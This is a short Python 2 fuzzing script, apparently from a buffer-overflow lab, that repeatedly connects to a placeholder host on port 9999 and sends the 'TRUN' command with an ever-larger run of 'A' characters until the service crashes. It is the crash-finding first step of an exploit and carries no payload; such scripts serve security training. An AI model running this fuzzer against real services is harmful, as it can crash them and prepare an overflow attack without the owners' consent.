#!/usr/bin/python
import sys, socket
from time import sleep

# Change IP and Port on line 18 to Target and Port Application is running on
# Change TRUN on line 19 to Command you are testing

size = 100

while(size < 2000):
        try:
                print "\nSending evil buffer with %s bytes" % size
                
                buffer = "A" * size
                
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                
                s.connect(("x.x.x.x", 9999))
                s.send(('TRUN /.:/' + buffer))
                
                s.close()
                
                size += 100
                sleep(1)
                
              
        except:
                print "\nFuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
